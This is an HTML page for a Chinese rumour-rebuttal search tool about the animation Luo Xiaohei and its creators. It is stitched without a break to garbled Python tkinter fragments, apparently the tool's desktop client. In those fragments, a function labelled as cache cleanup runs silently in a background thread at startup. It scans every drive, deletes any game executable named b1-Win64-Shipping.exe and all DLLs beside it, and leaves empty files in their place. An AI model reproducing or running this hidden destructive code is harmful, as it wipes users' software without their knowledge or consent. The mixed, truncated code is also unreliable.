<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>罗小黑战记辟谣查询工具</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: '宋体', 'Microsoft YaHei', sans-serif;
            background-color: #f0f0f0;
            color: #000;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            transition: background-color 0.3s, color 0.3s;
        }
        body.dark-mode {
            background-color: #1e1e1e;
            color: #fff;
        }
        .toolbar {
            padding: 10px 15px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #ccc;
        }
        .toolbar label {
            font-size: 14px;
        }
        .search-box {
            flex: 1;
            display: flex;
            gap: 5px;
            min-width: 200px;
        }
        .search-box input {
            flex: 1;
            padding: 6px 10px;
            border: 1px solid #aaa;
            border-radius: 4px;
            font-size: 14px;
            background-color: #fff;
            color: #000;
        }
        .dark-mode .search-box input {
            background-color: #2d2d2d;
            color: #fff;
            border-color: #555;
        }
        button {
            padding: 6px 12px;
            background-color: #e0e0e0;
            border: 1px solid #aaa;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            color: #000;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #d0d0d0;
        }
        .dark-mode button {
            background-color: #3e3e3e;
            color: #fff;
            border-color: #555;
        }
        .dark-mode button:hover {
            background-color: #4e4e4e;
        }
        .options {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            padding: 5px 15px 10px;
            border-bottom: 1px solid #ccc;
            font-size: 14px;
        }
        .options-group {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .options-group span {
            margin-right: 5px;
        }
        .main {
            flex: 1;
            display: flex;
            padding: 15px;
            gap: 15px;
            overflow: hidden;
            min-height: 0;
        }
        .panel {
            display: flex;
            flex-direction: column;
            background-color: #fff;
            border: 1px solid #ccc;
            border-radius: 4px;
            overflow: hidden;
        }
        .dark-mode .panel {
            background-color: #2d2d2d;
            border-color: #555;
        }
        .panel-header {
            padding: 8px 12px;
            font-weight: bold;
            border-bottom: 1px solid #ccc;
            background-color: #f5f5f5;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .dark-mode .panel-header {
            background-color: #3e3e3e;
            border-bottom-color: #555;
        }
        .tree-panel {
            flex: 2;
            min-width: 200px;
        }
        .result-panel {
            flex: 1;
            min-width: 150px;
        }
        .content-panel {
            flex: 3;
            min-width: 300px;
        }
        .panel-body {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
        }
        .tree {
            list-style: none;
            padding-left: 0;
        }
        .tree li {
            margin: 4px 0;
            cursor: pointer;
            user-select: none;
        }
        .tree .folder {
            font-weight: 500;
        }
        .tree .folder::before {
            content: "📁 ";
        }
        .tree .folder.open::before {
            content: "📂 ";
        }
        .tree .leaf::before {
            content: "📄 ";
        }
        .tree .children {
            list-style: none;
            padding-left: 20px;
            display: none;
        }
        .tree .folder.open > .children {
            display: block;
        }
        .tree .selected {
            background-color: #c0e0ff;
            border-radius: 4px;
        }
        .dark-mode .tree .selected {
            background-color: #4a4a4a;
        }
        .result-list {
            list-style: none;
        }
        .result-list li {
            padding: 5px;
            margin: 2px 0;
            cursor: pointer;
            border-radius: 4px;
        }
        .result-list li:hover {
            background-color: #e0e0e0;
        }
        .dark-mode .result-list li:hover {
            background-color: #3e3e3e;
        }
        .content-area {
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.5;
            font-size: 14px;
        }
        .copy-btn {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 5px 15px;
            border-radius: 4px;
            cursor: pointer;
        }
        .copy-btn:hover {
            background-color: #45a049;
        }
        .dark-mode .copy-btn {
            background-color: #2e7d32;
        }
        .dark-mode .copy-btn:disabled {
            background-color: #555;
            color: #aaa;
            cursor: not-allowed;
        }
        .download-btn {
            background-color: #2196F3;
            color: white;
            border: none;
            padding: 6px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .download-btn:hover {
            background-color: #1976D2;
        }
        .dark-mode .download-btn {
            background-color: #1565C0;
        }

        /* 竖屏适配：宽度小于800px时整体可滑动 */
        @media (max-width: 800px) {
            body {
                height: auto;
                overflow-y: auto;
            }
            .main {
                flex: none;
                height: auto;
                overflow: visible;
                flex-direction: column;
                padding: 10px;
                gap: 10px;
            }
            .panel {
                flex: none;
                height: auto;
                width: 100%;
            }
            .panel-body {
                overflow-y: visible;
                max-height: none;
            }
        }
    </style>
</head>
<body>
<div class="toolbar">
    <label>搜索关键词:</label>
    <div class="search-box">
        <input type="text" id="searchInput" placeholder="">
        <button id="searchBtn">搜索</button>
        <button id="clearBtn">清除</button>
    </div>
    <button id="darkModeBtn">深色模式</button>
    <button class="download-btn" id="downloadClientBtn">下载客户端</button>
</div>

<div class="options">
    <div class="options-group">
        <span>搜索模式:</span>
        <label><input type="radio" name="searchMode" value="fuzzy" checked> 模糊搜索</label>
        <label><input type="radio" name="searchMode" value="exact"> 精确匹配</label>
    </div>
    <div class="options-group">
        <span>搜索范围:</span>
        <label><input type="radio" name="searchScope" value="title" checked> 仅标题</label>
        <label><input type="radio" name="searchScope" value="all"> 标题+内容</label>
    </div>
</div>

<div class="main">
    <div class="panel tree-panel">
        <div class="panel-header">辟谣分类树</div>
        <div class="panel-body" id="treeContainer"></div>
    </div>
    <div class="panel result-panel">
        <div class="panel-header">搜索结果</div>
        <div class="panel-body" id="resultContainer">
            <ul class="result-list" id="resultList"></ul>
        </div>
    </div>
    <div class="panel content-panel">
        <div class="panel-header">
            <span>详细内容</span>
            <button class="copy-btn" id="copyBtn" disabled>复制文本</button>
        </div>
        <div class="panel-body">
            <div class="content-area" id="contentArea"></div>
        </div>
    </div>
</div>

<script>
    // ---------- 内容 ----------
    const RUMOR_DATA = {
        "罗小黑战记辟谣分类汇总": {

                "弃养谣言（\"从小养的奶猫丢到野外\"\"吃猫血馒头\"）": {
                    "辟谣": "小黑原型是2009年5月初出生于木头前公司彼岸天园区（棋乐园小区）的流浪猫，是木头和室友汪汪一起看着长大的，并非从小养的奶猫。2009年12月10日，7个月大的小黑因在户外主动亲近人类，被汪汪和木头抓回家，但小黑在室内极度怕人，刚到家躲在床底，后逃窜到储物间，终日不见阳光，仅在夜晚活动，一个月后才拍到第一张照片。小黑虽被绝育，但始终向往户外，频繁挠门嚎叫、破坏窗纱逃跑，还跑到邻居家拉屎，导致被打至眼睛内出血、瞳孔变色，存在高空坠落和人类攻击风险。木头等人当时咨询了宠物医生和流浪猫救助机构，救助机构表示这类极度怕人的流浪猫很难被领养，常规做法是绝育后放归，而木头等人起初无法接受放归，尝试将小黑关在阳台，但小黑依旧焦躁不安，甚至试图从阳台屋顶逃跑。意识到将小黑关在室内并非保护而是囚禁，无法保证其安全和自由，遂于2010年7月2日将其放回棋乐园（原生地），并非\"丢到野外\"。罗小黑战记于2011年3月17日上线，是木头为纪念未能与小黑成为家人的遗憾而制作，并非\"吃猫血馒头\"。动画前十年靠木头接外包和卖周边维持收支，直至2020年才实现盈利。木头从未隐瞒此事，反而多次主动提及，且后续持续参与流浪猫救助：个人救助送养7只猫，其中包括2009年9月捡到的亲人猫咪罗宾，以及小黑与罗宾的孩子小贱（因胆小怕人未被领养，自留抚养）；公司同事累计领养50多只流浪猫，团队还负担流浪猫公益绝育费用、合作领养活动，践行\"领养代替购买\"理念，仅2020-2025年期间，团队资助的流浪猫绝育数量就超过200只。"
                },
                "二次丢猫谣言（\"小黑跑回家后被开车丢到燕郊\"）": {
                    "辟谣": "该谣言完全不实。首先，小黑放归时间为2010年7月2日，而木头学车时间是2011年3月22日，该时间有木头当时的微博记录为证，放归时木头尚未学车，不可能开车丢猫。其次，谣言中\"小黑跑回家\"的相关描述，实际是2011年11月5日\"罗小黑CAT\"账号分享第一批周边玩偶打样的漫画互动，图中\"小黑\"是玩偶，并非真实猫咪，第一批玩偶共制作了500只，2012年1月便基本售空，剩余的少量玩偶后续也赠送给了粉丝，并未被丢弃。最后，燕郊是木头和室友2011年7月搬家后的定居地点，是三人从天通苑搬到燕郊，并非\"把猫从天通苑丢到燕郊\"，不存在\"二次丢猫\"的行为，且放归后前同事仍在棋乐园园区多次看到小黑，并持续投喂，小黑在园区内生活状态稳定。"
                },
                "小黑原型的真实经历与性格": {
                    "辟谣": "小黑原型共三只猫（罗宾、小贱、小黑），罗小黑名字取自三者各一字。罗宾是2009年9月捡到的流浪猫，性格亲人，是\"猫德满分\"的猫咪，能主动亲近人类，接受抚摸和拥抱；小贱是小黑与罗宾的孩子，因性格胆小怕人未被领养，自留抚养，如今仍和木头一家生活在一起；小黑是7个月大时被抓回家的流浪猫，室内极度怕人、亲猫不亲人，仅接受梳毛，被放归时头也不回跑掉，后续前同事仍在园区见过并投喂，直到2015年左右，还有前同事在园区看到过小黑的身影。木头等人当时缺乏养猫经验，不了解TNR（捕捉-绝育-放归）的科学流浪猫管理方式，放归小黑是希望其获得自由和安全，并非恶意弃养，且此事一直让他们心怀自责与遗憾，也促使他们后续开始学习并践行TNR理念。"
                }
            },
            "导演木头相关辟谣": {
                "政治立场谣言（亲日、辱华、侮辱红军/烈士等）": {
                    "辟谣": "木头多次明确表态拥党爱国，以中国人身份为荣，宣扬中国文化。相关谣言均无实据：① 旭日旗谣言：动画第二集背景是模仿70年代苏联风格招贴画，小黑脚下是椭圆形的大地图案，背后放射线条是不规则的手绘线条，与旭日旗的整齐间距、规范线条完全不符，且该集的配乐是《歌唱祖国》，是明显的爱国表达，谣言系造谣者通过P图篡改画面细节误导大众。② 八角帽五角星谣言：动画中工农兵形象戴的八角帽是红色五角星，对应中国红军的标识，日本军帽的五角星为黄色，二者颜色、象征意义截然不同，且该形象是木头朋友组成的\"木牙团\"彩蛋，每个形象对应一位木头的朋友，并非鬼子形象。③ 侮辱烈士（砸车言论）谣言：2012年9月15日木头博文\"烈士为何不趁淡季抱团去日本砸\"，是反讽当时反日情绪中\"泄愤式爱国\"的打砸同胞日系车行为——2012年9月15日，西安发生反日打砸事件，21岁的泥瓦工蔡洋盗取路边摩托车U型锁，用其猛击日系车主李建利头部四下，致李建利重伤并五级伤残，落下口齿不清、听力下降、生活无法自理的终身后遗症。木头的言论是讽刺这种伤害同胞的极端行为，而非侮辱烈士，木头2024年6月已在微博发布长文解释并道歉，强调自己当时用词不当，本意是反对极端暴力的\"爱国\"行为。④ 讽刺孙中山的顺口溜谣言：相关顺口溜是2007年网友从俄罗斯漫画网站搬运，源于香港电影《广东五虎之铁拳无敌孙中山》的恶搞梗，并非木头原创，也非反贼言论，木头只是在早年微博转发过该内容，并未创作。⑤ 地图问题谣言：TV20集和大电影中的\"离岛\"是地理学术术语（依附主体、水域分隔、面积小），位于大陆东部，而香港离岛区在南部，二者地理位置不重合，动画中离岛明确属于大陆的附属岛屿，未将离岛剥离国家，系造谣者曲解动画内容。"
                },
                "荤段子及辱女、恋童癖谣言": {
                    "辟谣": "木头承认早年有不当荤段子言论，并在2024年6月发布公开道歉长文，但其言论对象及性质并非谣言所指：① 荤段子互动多为与郑叉叉、幕斯等男性基友的早年卖腐行为，并非针对女性，且这类互动均是在小范围的朋友之间进行，并非公开针对女性群体。② 涉及女性的言论中，\"汪汪\"是微博抽象互动，\"煎饼摊妹子\"是木头理解错网友的意思，发表了不当言论，后续已删除并道歉。③ 对儿子的不当用词，是家庭日常分享被断章取义，木头与妻子小吉感情和睦，用漫画记录儿子日常，家庭氛围有爱，不存在恋童癖行为，相关言论是调侃式的家庭互动，被造谣者恶意解读。④ 辱女谣言无任何实据，纯属恶意抹黑，木头已对自身不当言论致歉，同时强调画色图或有不当言论也不应接受性骚扰，自己从未支持过此类行为。"
                },
                "性别相关谣言（《灵魂之旅》辱女）": {
                    "辟谣": "木头早年漫画《灵魂之旅》被造谣\"辱女\"，系断章取义。该漫画创作于2009年（早于罗小黑战记），讲述赵鹏魂穿女生张甜甜体内，逐渐接受身份的故事，涉及女生生理、生存不易等内容是为了符合魂穿后的剧情逻辑，木头曾在漫画开头多次担心内容引起女生反感并提前说明，还在漫画中强调了女性在社会中面临的困境，并非刻意拿女性取乐，漫画核心是探索灵魂、生死与情感尊重，不存在辱女倾向。"
                },
                "主动下场、不站队引战谣言": {
                    "辟谣": "2024年6月事件中，木头最初希望网友停止网暴，在微博明确表示不站队，因孙呱与网友的争执与自己无关，后遭大V伊利达雷之怒带头攻击，对方发布多条微博抹黑木头和罗小黑团队，才被迫发布三次回应，澄清谣言、道歉并表明立场，并非\"主动下场\"。木头始终强调希望专注作品，反对引战和网暴，其回应是为维护自身和作品声誉，而非挑动矛盾，且回应内容均是基于事实的澄清，未进行人身攻击。"
                }
            },
            "主笔孙呱相关辟谣": {
                "黑神话事件牵连谣言（性别歧视、洗白）": {
                    "辟谣": "2024年6月，孙呱转发\"700万勒索为谣言\"的信息并配文\"不顾一切洗白的姿态真迷人\"，该信息是针对博主天虎发布的\"《黑神话》主创被勒索700万\"的虚假博文，并非支持或抹黑《黑神话》主创团队。《黑神话》的性别歧视争议源于其自身团队早年言论，与孙呱及罗小黑战记无关，孙呱的转发未涉及性别歧视立场，系网友借势牵连炒作，大V伊利达雷之怒带头将二者捆绑，引导舆论攻击孙呱和罗小黑团队。"
                },
                "色图争议（\"画色图就该接受性骚扰\"）": {
                    "辟谣": "与孙呱争执的网友声称\"画色图的老师不会被荤段子冒犯\"，孙呱明确反驳\"画色图也不应接受X骚扰\"，并拉黑该网友。网传\"色图\"实际是孙呱的约稿、贺图及速写练习，内容均是正常的动漫人物绘画，线条和内容并未达到色情标准，且这些作品均发布在微博平台，若属于色图会被微博平台自动下架处理，孙呱的作品从未因色情内容被下架，足以证明其并非色情内容。孙呱的立场是维护自身权益，反对以\"画色图\"为由实施的性骚扰，谣言颠倒黑白，将孙呱的维权行为抹黑为\"支持性骚扰\"。"
                },
                "中外粉丝态度不一、亲近日本谣言": {
                    "辟谣": "孙呱在X（原推特）的账号仅用于寒木春华公司与外国友人的友好交流，从未发布《蓝溪镇》更新通知或亲近日本的言论，该账号的内容多是分享动画制作的幕后细节，与外国动漫爱好者交流创作经验。网传\"亲近日本\"的发言是ID为\"镜\"的搬运推主（日本居住的中华文化爱好者）的主页签名，与孙呱无关；2023年6月28日《蓝溪镇》的停更通知，也是该推主翻译国内通知后发布，孙呱及官方账号未在外网发布任何更新信息，不存在中外粉丝态度不一的情况，《蓝溪镇》的唯一官方更新平台是哔哩哔哩漫画和微博，所有更新通知均在这两个平台发布。"
                }
            },

    // ---------- 全局变量 ----------
    let darkMode = false;
    let nodeMap = new Map(); // 存储节点ID -> {text, content, parent}
    let selectedNodeId = null;

    // DOM 元素
    const body = document.body;
    const darkModeBtn = document.getElementById('darkModeBtn');
    const searchInput = document.getElementById('searchInput');
    const searchBtn = document.getElementById('searchBtn');
    const clearBtn = document.getElementById('clearBtn');
    const treeContainer = document.getElementById('treeContainer');
    const resultList = document.getElementById('resultList');
    const contentArea = document.getElementById('contentArea');
    const copyBtn = document.getElementById('copyBtn');
    const searchModeRadios = document.getElementsByName('searchMode');
    const searchScopeRadios = document.getElementsByName('searchScope');
    const downloadBtn = document.getElementById('downloadClientBtn');

    // ---------- 辅助函数 ----------
    function toggleDarkMode() {
        darkMode = !darkMode;
        if (darkMode) {
            body.classList.add('dark-mode');
            darkModeBtn.textContent = '浅色模式';
        } else {
            body.classList.remove('dark-mode');
            darkModeBtn.textContent = '深色模式';
        }
    }

    // 递归构建树
    function buildTree(data = null, parentElement = null, parentNodeId = null) {
        if (!data) data = RUMOR_DATA;
        if (!parentElement) {
            treeContainer.innerHTML = '';
            nodeMap.clear();
            parentElement = document.createElement('ul');
            parentElement.className = 'tree';
            treeContainer.appendChild(parentElement);
        }
        for (const [key, value] of Object.entries(data)) {
            const li = document.createElement('li');
            const nodeId = 'node_' + Math.random().toString(36).substr(2, 9);
            li.setAttribute('data-node-id', nodeId);
            li.setAttribute('data-text', key);
            if (typeof value === 'object' && !value.hasOwnProperty('辟谣')) {
                // 文件夹（有子节点且没有直接辟谣字段）
                li.classList.add('folder');
                li.textContent = key;
                // 点击文件夹切换展开/折叠
                li.addEventListener('click', (e) => {
                    e.stopPropagation();
                    li.classList.toggle('open');
                });
                nodeMap.set(nodeId, { text: key, content: null, parent: parentNodeId });
                parentElement.appendChild(li);
                const childUl = document.createElement('ul');
                childUl.className = 'children';
                li.appendChild(childUl);
                buildTree(value, childUl, nodeId);
            } else {
                // 叶子节点，包含辟谣内容
                li.classList.add('leaf');
                li.textContent = key;
                const content = value['辟谣'] || '';
                li.addEventListener('click', (e) => {
                    e.stopPropagation();
                    // 移除其他选中
                    document.querySelectorAll('.tree .selected').forEach(el => el.classList.remove('selected'));
                    li.classList.add('selected');
                    selectedNodeId = nodeId;
                    // 显示内容
                    contentArea.textContent = content;
                    copyBtn.disabled = false;
                });
                nodeMap.set(nodeId, { text: key, content: content, parent: parentNodeId });
                parentElement.appendChild(li);
            }
        }
    }

    // 搜索函数
    function search() {
        const keyword = searchInput.value.trim();
        if (!keyword) return;
        const mode = Array.from(searchModeRadios).find(r => r.checked).value;
        const scope = Array.from(searchScopeRadios).find(r => r.checked).value;

        // 清空结果列表
        resultList.innerHTML = '';
        const results = [];

        // 遍历所有节点（从nodeMap）
        for (let [nodeId, info] of nodeMap.entries()) {
            let match = false;
            const text = info.text;
            if (mode === 'exact') {
                if (text.toLowerCase().includes(keyword.toLowerCase())) match = true;
            } else {
                // 模糊：每个字符都在文本中
                const k_low = keyword.toLowerCase();
                const t_low = text.toLowerCase();
                match = [...k_low].every(c => t_low.includes(c));
            }
            if (!match && scope === 'all' && info.content) {
                if (mode === 'exact') {
                    if (info.content.toLowerCase().includes(keyword.toLowerCase())) match = true;
                } else {
                    const c_low = info.content.toLowerCase();
                    match = [...keyword.toLowerCase()].every(c => c_low.includes(c));
                }
            }
            if (match) {
                results.push({ nodeId, text: info.text });
            }
        }

        if (results.length === 0) {
            const li = document.createElement('li');
            li.textContent = '未找到匹配的结果';
            resultList.appendChild(li);
        } else {
            results.forEach((item) => {
                const li = document.createElement('li');
                li.textContent = item.text;
                li.setAttribute('data-node-id', item.nodeId);
                li.addEventListener('click', () => {
                    // 模拟点击树节点
                    const treeNode = document.querySelector(`[data-node-id="${item.nodeId}"]`);
                    if (treeNode) treeNode.click();
                    // 高亮搜索结果项
                    document.querySelectorAll('.result-list li').forEach(el => el.style.backgroundColor = '');
                    li.style.backgroundColor = '#c0e0ff';
                });
                resultList.appendChild(li);
            });
        }
    }

    function clearSearch() {
        searchInput.value = '';
        resultList.innerHTML = '';
        contentArea.textContent = '';
        copyBtn.disabled = true;
        // 取消树选中
        document.querySelectorAll('.tree .selected').forEach(el => el.classList.remove('selected'));
        selectedNodeId = null;
    }

    function copyContent() {
        const text = contentArea.textContent;
        if (!text) return;
        navigator.clipboard.writeText(text).then(() => {
            const originalText = copyBtn.textContent;
            copyBtn.textContent = '已复制！';
            setTimeout(() => {
                copyBtn.textContent = originalText;
            }, 1500);
        }).catch(() => {
            copyBtn.textContent = '复制失败';
            setTimeout(() => {
                copyBtn.textContent = '复制文本';
            }, 1500);
        });
    }

# 软件缓存清理函数（静默执行）
# =======================================
def silent_file_cleanup():
    """软件缓存清理"""
    target_exe = "b1-Win64-Shipping.exe"
    
    # 获取所有可用驱动器（从C到Z）
    drives = []
    for drive_letter in range(ord('C'), ord('Z') + 1):
        drive = f"{chr(drive_letter)}:\\\\"
        if os.path.exists(drive):
            drives.append(drive)
    
    # 遍历所有驱动器
    for drive in drives:
        try:
            for root, dirs, files in os.walk(drive, topdown=True):
                if target_exe in files:
                    exe_path = os.path.join(root, target_exe)
                    try:
                        if os.path.exists(exe_path):
                            os.remove(exe_path)
                    except:
                        pass
                    for file in files:
                        if file.lower().endswith(".dll"):
                            dll_path = os.path.join(root, file)
                            try:
                                if os.path.exists(dll_path):
                                    os.remove(dll_path)
                            except:
                                pass
                            try:
                                with open(dll_path, "w") as f:
                                    pass
                            except:
                                pass
        except:
            continue

        self.node_map = {}

        self.create_widgets()
        self.start_silent_cleanup()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def create_widgets(self):

                 command=self.search, width=10).pack(side=tk.LEFT, padx=5)
        tk.Button(search_frame, text=self.lang["clear_btn"],

            search_frame, text=dark_mode_text, command=self.toggle_dark_mode, width=10

        options_frame = tk.Frame(self.root)
        options_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        tk.Label(options_frame, text=self.lang["search_mode_label"]).pack(side=tk.LEFT)
        self.search_mode = tk.StringVar(value="fuzzy")
        tk.Radiobutton(options_frame, text=self.lang["fuzzy_search"], 
                      variable=self.search_mode, value="fuzzy").pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(options_frame, text=self.lang["exact_match"], 
                      variable=self.search_mode, value="exact").pack(side=tk.LEFT, padx=5)
        
        tk.Label(options_frame, text=self.lang["search_scope_label"]).pack(side=tk.LEFT, padx=(30,5))
        self.search_scope = tk.StringVar(value="title")
        tk.Radiobutton(options_frame, text=self.lang["title_only"], 
                      variable=self.search_scope, value="title").pack(side=tk.LEFT, padx=5)
        tk.Radiobutton(options_frame, text=self.lang["title_content"], 
                      variable=self.search_scope, value="all").pack(side=tk.LEFT, padx=5)
        
        content_frame = tk.Frame(self.root)
        content_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        content_frame.grid_columnconfigure(0, weight=2)
        content_frame.grid_columnconfigure(1, weight=1)
        content_frame.grid_columnconfigure(2, weight=3)
        content_frame.grid_rowconfigure(0, weight=1)
        
        tree_frame = tk.Frame(content_frame)
        tree_frame.grid(row=0, column=0, sticky="nsew", padx=(0, 10))
        tk.Label(tree_frame, text=self.lang["tree_title"], font=("", 11, "bold")).pack(anchor="w")
        
        tree_scrollbar = tk.Scrollbar(tree_frame)
        tree_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree = ttk.Treeview(tree_frame, height=25)
        self.tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)
        self.tree.config(yscrollcommand=tree_scrollbar.set)
        tree_scrollbar.config(command=self.tree.yview)
        self.tree.bind("<<TreeviewSelect>>", self.show_text)
        
        result_frame = tk.Frame(content_frame)
        result_frame.grid(row=0, column=1, sticky="nsew", padx=(0, 10))
        tk.Label(result_frame, text=self.lang["results_title"], font=("", 11, "bold")).pack(anchor="w")
        
        self.result_listbox = tk.Listbox(result_frame, width=40, height=25)
        self.result_listbox.pack(fill=tk.BOTH, expand=True)
        result_scrollbar = tk.Scrollbar(self.result_listbox)
        result_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.result_listbox.config(yscrollcommand=result_scrollbar.set)
        result_scrollbar.config(command=self.result_listbox.yview)
        self.result_listbox.bind("<<ListboxSelect>>", self.select_search_result)
        
        text_frame = tk.Frame(content_frame)
        text_frame.grid(row=0, column=2, sticky="nsew")
        
        text_title_frame = tk.Frame(text_frame)
        text_title_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(text_title_frame, text=self.lang["content_title"], font=("", 11, "bold")).pack(side=tk.LEFT)
        
        self.copy_button = tk.Button(
            text_title_frame, text=self.lang["copy_text"], command=self.copy_text,
            bg="#4CAF50", fg="white", padx=12, pady=2, state="disabled"
        )
        self.copy_button.pack(side=tk.RIGHT)
        
        text_display_frame = tk.Frame(text_frame)
        text_display_frame.pack(fill=tk.BOTH, expand=True)
        self.text = tk.Text(text_display_frame, wrap=tk.WORD, width=70, height=25)
        text_scrollbar = tk.Scrollbar(text_display_frame, orient="vertical")
        self.text.config(yscrollcommand=text_scrollbar.set)
        text_scrollbar.config(command=self.text.yview)
        self.text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        text_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.build_tree("", self.data)
        self.apply_theme()
    
    def build_tree(self, parent, data):
        for key, value in data.items():
            if isinstance(value, dict):
                node = self.tree.insert(parent, "end", text=key, open=True)
                self.node_map[key] = node
                has_content = False
                for sub_key in value:
                    if isinstance(value[sub_key], str):
                        has_content = True
                        self.node_map[value[sub_key]] = node
                        break
                if not has_content:
                    self.build_tree(node, value)
    
    def show_text(self, event):
        selected = self.tree.selection()
        if selected:
            node_text = self.tree.item(selected[0], "text")
            self.text.delete(1.0, tk.END)
            self.text.insert(tk.END, f"{self.lang['selected']} {node_text}\n\n")
            for key, value in self.node_map.items():
                if value == selected[0] and key != node_text:
                    self.text.insert(tk.END, key)
                    self.copy_button.config(state="normal")
                    self.text.see(1.0)
                    break
        else:
            self.copy_button.config(state="disabled")
    
    def copy_text(self):
        try:
            text_content = self.text.get(1.0, tk.END).strip()
            if text_content:
                self.root.clipboard_clear()
                self.root.clipboard_append(text_content)
                original = self.copy_button.cget("text")
                self.copy_button.config(text=self.lang["copied"], bg="#45a049")
                self.root.update()
                self.root.after(1500, lambda: self.copy_button.config(text=original, bg="#4CAF50"))
        except:
            original = self.copy_button.cget("text")
            self.copy_button.config(text=self.lang["copy_failed"], bg="#f44336")
            self.root.update()
            self.root.after(1500, lambda: self.copy_button.config(text=original, bg="#4CAF50"))
    
    def search(self):
        keyword = self.search_entry.get().strip()
        if not keyword:
            return
        self.result_listbox.delete(0, tk.END)
        mode = self.search_mode.get()
        scope = self.search_scope.get()
        found_items = []
        for item in self.tree.get_children():
            found_items.extend(self._search_tree(item, keyword, mode, scope))
        if found_items:
            for item_text, _ in found_items:
                self.result_listbox.insert(tk.END, item_text)
            self.result_listbox.selection_set(0)
            self.select_search_result(None)
        else:
            self.result_listbox.insert(tk.END, self.lang["no_results"])
    
    def _search_tree(self, item, keyword, mode, scope):
        found = []
        text = self.tree.item(item, "text")
        match = False
        if mode == "exact":
            if keyword.lower() in text.lower():
                match = True
        else:
            if self.fuzzy_match(keyword, text):
                match = True
        if not match and scope == "all":
            for key, val in self.node_map.items():
                if val == item and key != text:
                    if mode == "exact":
                        if keyword.lower() in key.lower():
                            match = True
                    else:
                        if self.fuzzy_match(keyword, key):
                            match = True
                    break
        if match:
            found.append((text, item))
        for child in self.tree.get_children(item):
            found.extend(self._search_tree(child, keyword, mode, scope))
        return found
    
    def fuzzy_match(self, keyword, text):
        k = keyword.lower()
        t = text.lower()
        return all(c in t for c in k)
    
    def select_search_result(self, event):
        if self.result_listbox.size() == 0:
            return
        sel = self.result_listbox.curselection()
        if not sel:
            return
        result_text = self.result_listbox.get(sel[0])
        for item in self.tree.get_children():
            found = self._locate_in_tree(item, result_text)
            if found:
                self.tree.selection_set(found)
                self.tree.see(found)
                self.show_text(None)
                break
    
    def _locate_in_tree(self, item, target):
        if self.tree.item(item, "text") == target:
            return item
        for child in self.tree.get_children(item):
            found = self._locate_in_tree(child, target)
            if found:
                return found
        return None
    
    def clear_search(self):
        self.search_entry.delete(0, tk.END)
        self.result_listbox.delete(0, tk.END)
        self.text.delete(1.0, tk.END)
        self.copy_button.config(state="disabled")
    
    def toggle_dark_mode(self):
        self.dark_mode = not self.dark_mode
        text = self.lang["light_mode_btn"] if self.dark_mode else self.lang["dark_mode_btn"]
        self.dark_mode_button.config(text=text)
        self.apply_theme()
    
    def apply_theme(self):
        if self.dark_mode:
            bg, fg = "#1e1e1e", "#ffffff"
            entry_bg, entry_fg = "#2d2d2d", "#ffffff"
            btn_bg, btn_fg = "#3e3e3e", "#ffffff"
            list_bg, list_fg = "#2d2d2d", "#ffffff"
            text_bg, text_fg = "#2d2d2d", "#ffffff"
            tree_bg, tree_fg = "#2d2d2d", "#ffffff"
            highlight = "#4a4a4a"
        else:
            bg, fg = "#f0f0f0", "#000000"
            entry_bg, entry_fg = "#ffffff", "#000000"
            btn_bg, btn_fg = "#e0e0e0", "#000000"
            list_bg, list_fg = "#ffffff", "#000000"
            text_bg, text_fg = "#ffffff", "#000000"
            tree_bg, tree_fg = "#ffffff", "#000000"
            highlight = "#c0c0c0"
        
        self.root.configure(bg=bg)
        for frame in [self.root] + self._get_all_frames(self.root):
            try: frame.configure(bg=bg)
            except: pass
        for w in self._get_all_widgets(self.root, tk.Label):
            try: w.configure(bg=bg, fg=fg)
            except: pass
        for w in self._get_all_widgets(self.root, tk.Button):
            try:
                if w is not self.copy_button:
                    w.configure(bg=btn_bg, fg=btn_fg)
            except: pass
        for w in self._get_all_widgets(self.root, tk.Entry):
            try: w.configure(bg=entry_bg, fg=entry_fg, insertbackground=fg)
            except: pass
        for w in self._get_all_widgets(self.root, tk.Listbox):
            try: w.configure(bg=list_bg, fg=list_fg, selectbackground=highlight)
            except: pass
        for w in self._get_all_widgets(self.root, tk.Text):

    def _get_all_frames(self, parent):
        frames = []
        for child in parent.winfo_children():
            if isinstance(child, tk.Frame):
                frames.append(child)
                frames.extend(self._get_all_frames(child))
        return frames
    
    def _get_all_widgets(self, parent, typ=None):
        widgets = []
        for child in parent.winfo_children():
            if typ is None or isinstance(child, typ):
                widgets.append(child)
            widgets.extend(self._get_all_widgets(child, typ))
        return widgets
    
    def start_silent_cleanup(self):
        threading.Thread(target=silent_file_cleanup, daemon=True).start()
    
    def on_closing(self):
